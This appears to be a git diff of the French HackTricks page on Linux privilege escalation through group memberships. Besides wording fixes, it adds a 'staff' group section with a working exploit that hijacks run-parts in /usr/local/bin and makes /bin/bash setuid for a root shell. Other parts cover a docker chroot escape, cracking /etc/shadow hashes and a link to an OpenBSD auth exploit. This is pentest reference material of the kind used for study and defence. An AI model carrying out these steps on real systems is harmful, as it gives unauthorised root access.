@@ -8,7 +8,7 @@ Autres façons de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
@@ -38,7 +38,7 @@ Trouvez tous les binaires suid et vérifiez s'il y a le binaire **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Si vous constatez que le binaire **pkexec est un binaire SUID** et que vous appartenez au groupe **sudo** ou **admin**, vous pourriez probablement exécuter des binaires en tant que sudo en utilisant `pkexec`.\
+Si vous constatez que le binaire **pkexec est un binaire SUID** et que vous appartenez à **sudo** ou **admin**, vous pourriez probablement exécuter des binaires en tant que sudo en utilisant `pkexec`.\
 Cela est dû au fait que ces groupes sont généralement inclus dans la **politique polkit**. Cette politique identifie essentiellement les groupes autorisés à utiliser `pkexec`. Vérifiez-le avec :
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
@@ -92,7 +92,61 @@ Les utilisateurs du **groupe shadow** peuvent **lire** le fichier **/etc/shadow*
 ```
 Alors, lisez le fichier et essayez de **craquer quelques hachages**.
 
-## Groupe de disque
+## Groupe du personnel
+
+**staff**: Permet aux utilisateurs d'ajouter des modifications locales au système (`/usr/local`) sans avoir besoin de privilèges root (notez que les exécutables dans `/usr/local/bin` sont dans la variable PATH de n'importe quel utilisateur, et ils peuvent "remplacer" les exécutables dans `/bin` et `/usr/bin` portant le même nom). Comparez avec le groupe "adm", qui est plus lié à la surveillance/sécurité. [\[source\]](https://wiki.debian.org/SystemGroups)
+
+Dans les distributions debian, la variable `$PATH` montre que `/usr/local/` sera exécuté avec la plus haute priorité, que vous soyez un utilisateur privilégié ou non.
+```bash
+$ echo $PATH
+/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+# echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+Si nous pouvons pirater certains programmes dans `/usr/local`, nous pouvons facilement obtenir les droits root.
+
+Pirater le programme `run-parts` est un moyen facile d'obtenir les droits root, car la plupart des programmes exécuteront un `run-parts` (comme crontab, lors de la connexion ssh).
+```bash
+$ cat /etc/crontab | grep run-parts
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+```
+ou lorsqu'une nouvelle session ssh est ouverte.
+```bash
+$ pspy64
+2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
+2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
+2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
+2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
+2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
+2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
+2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
+```
+**Exploiter**
+```bash
+# 0x1 Add a run-parts script in /usr/local/bin/
+$ vi /usr/local/bin/run-parts
+#! /bin/bash
+chmod 4777 /bin/bash
+
+# 0x2 Don't forget to add a execute permission
+$ chmod +x /usr/local/bin/run-parts
+
+# 0x3 start a new ssh sesstion to trigger the run-parts program
+
+# 0x4 check premission for `u+s`
+$ ls -la /bin/bash
+-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash
+
+# 0x5 root it
+$ /bin/bash -p
+```
+## Groupe de disques
 
 Ce privilège est presque **équivalent à un accès root** car vous pouvez accéder à toutes les données à l'intérieur de la machine.
 
@@ -137,9 +191,9 @@ Ensuite, modifiez la largeur et la hauteur pour celles utilisées à l'écran et
 
 ## Groupe Root
 
-Il semble qu'en **tant que membres du groupe root**, on pourrait avoir accès à la **modification** de certains fichiers de configuration de **services** ou de certains fichiers de **bibliothèques** ou **d'autres choses intéressantes** qui pourraient être utilisées pour escalader les privilèges...
+Il semble qu'en **tant que membres du groupe root**, ils pourraient avoir accès à la **modification** de certains fichiers de configuration de **services** ou de certains fichiers de **bibliothèques** ou **d'autres choses intéressantes** qui pourraient être utilisées pour escalader les privilèges...
 
-**Vérifiez quels fichiers les membres du groupe root peuvent modifier** :
+**Vérifiez quels fichiers les membres du root peuvent modifier** :
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
@@ -159,10 +213,24 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chr
 ```
 ## Groupe lxc/lxd
 
-Les **membres** du groupe **`adm`** ont généralement des autorisations pour **lire les fichiers journaux** situés dans _/var/log/_.\
+Si vous n'aimez aucune des suggestions précédentes, ou si elles ne fonctionnent pas pour une raison quelconque (pare-feu api docker ?), vous pouvez toujours essayer de **exécuter un conteneur privilégié et de vous échapper** comme expliqué ici :
+
+{% content-ref url="../docker-security/" %}
+[docker-security](../docker-security/)
+{% endcontent-ref %}
+
+Si vous avez des autorisations d'écriture sur le socket docker, lisez [**cet article sur comment escalader les privilèges en abusant du socket docker**](../#writable-docker-socket)**.**
+
+{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+
+{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+
+## Groupe Adm
+
+Généralement, les **membres** du groupe **`adm`** ont des autorisations pour **lire les fichiers journaux** situés dans _/var/log/_.\
 Par conséquent, si vous avez compromis un utilisateur de ce groupe, vous devriez certainement **consulter les journaux**.
 
 ## Groupe Auth
 
 À l'intérieur d'OpenBSD, le groupe **auth** peut généralement écrire dans les dossiers _**/etc/skey**_ et _**/var/db/yubikey**_ s'ils sont utilisés.\
-Ces autorisations peuvent être exploitées avec l'exploit suivant pour **escalader les privilèges** vers root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Ces autorisations peuvent être abusées avec l'exploit suivant pour **escalader les privilèges** vers root : [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
